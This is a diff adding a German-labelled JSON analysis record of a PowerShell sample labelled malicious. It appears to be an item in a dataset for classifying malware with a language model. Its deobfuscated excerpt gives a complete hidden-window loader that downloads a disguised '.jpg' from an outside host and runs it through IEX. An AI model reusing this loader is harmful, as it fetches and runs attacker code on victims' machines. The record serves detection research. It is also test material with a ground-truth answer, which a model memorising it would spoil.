@@ -1,0 +1,124 @@
+{
+  "meta": {
+    "quelldatei": "094c5bdd350a0f2a9108ff23e6835e1a892170f23b573cc6dc6d829c4b079374.ps1",
+    "sha256": "094c5bdd350a0f2a9108ff23e6835e1a892170f23b573cc6dc6d829c4b079374",
+    "groesse_bytes": 673,
+    "zeilen": 1,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "SilentlyContinue",
+      "[void",
+      "] [Syst",
+      "em.Refle",
+      "ction.Asse",
+      "mbly]::LoadWi",
+      "thPartialName(",
+      "Microsoft.VisualBasic",
+      "|IEX;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty=",
+      "Obje",
+      "ct Ne",
+      "t.We",
+      "bCli",
+      "ent)",
+      "Down",
+      "load",
+      "Str",
+      "ing",
+      "http",
+      "://tabelacim.com.tr/2x2.jpg"
+    ],
+    "string_anzahl_gesamt": 21,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "SilentlyContinue",
+      "[void",
+      "] [Syst",
+      "em.Refle",
+      "ction.Asse",
+      "mbly]::LoadWi",
+      "thPartialName(",
+      "Microsoft.VisualBasic",
+      "|IEX;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty=",
+      "Obje",
+      "ct Ne",
+      "t.We",
+      "bCli",
+      "ent)",
+      "Down",
+      "load",
+      "Str",
+      "ing",
+      "http",
+      "://tabelacim.com.tr/2x2.jpg"
+    ],
+    "string_anzahl_gesamt": 21,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "window_hidden": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "SilentlyContinue",
+      "[void",
+      "] [Syst",
+      "em.Refle",
+      "ction.Asse",
+      "mbly]::LoadWi",
+      "thPartialName(",
+      "Microsoft.VisualBasic",
+      "|IEX;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty=",
+      "Obje",
+      "ct Ne",
+      "t.We",
+      "bCli",
+      "ent)",
+      "Down",
+      "load",
+      "Str",
+      "ing",
+      "http",
+      "://tabelacim.com.tr/2x2.jpg"
+    ],
+    "string_anzahl_gesamt": 21,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "window_hidden": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ]
+    },
+    "deobfuskiert_auszug": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -WindowStyle hidden $ErrorActionPreference = 'SilentlyContinue';$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;'[void] [Syst' + 'em.Reflection.Asse' + 'mbly]::LoadWithPartialName(''Microsoft.VisualBasic'')'|IEX;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-Obje'+'ct Net.We'+'bClient)'|IEX;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'Download' + 'String',[Microsoft.VisualBasic.CallType]::Method,'http://tabelacim.com.tr/2x2.jpg')|IEX",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
